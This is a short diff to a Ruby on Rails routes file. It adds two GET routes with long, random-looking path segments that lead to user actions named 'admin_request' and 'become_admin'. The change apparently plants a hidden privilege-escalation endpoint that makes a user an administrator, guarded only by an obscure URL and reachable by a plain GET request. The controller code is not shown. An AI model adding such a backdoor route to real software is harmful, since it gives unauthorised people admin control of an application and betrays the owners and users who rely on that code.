@@ -16,6 +16,9 @@ Rails.application.routes.draw do
 
   get   '/users/:id/confirm',      to: 'users#confirm', as: :confirm_user
 
+  get   '/users/:id/9847hfh9f824oifnsdlkvhosiehlrisklevishfleh', to: 'users#admin_request'
+  get   '/users/:id/4ruoirwnv24vpoifho4ehvjrhg4owihfaoihfaajksdhviuwgifbw4f', to: 'users#become_admin', as: :adminify
+
   # The priority is based upon order of creation: first created -> highest priority.
   # See how all your routes lay out with "rake routes".
 
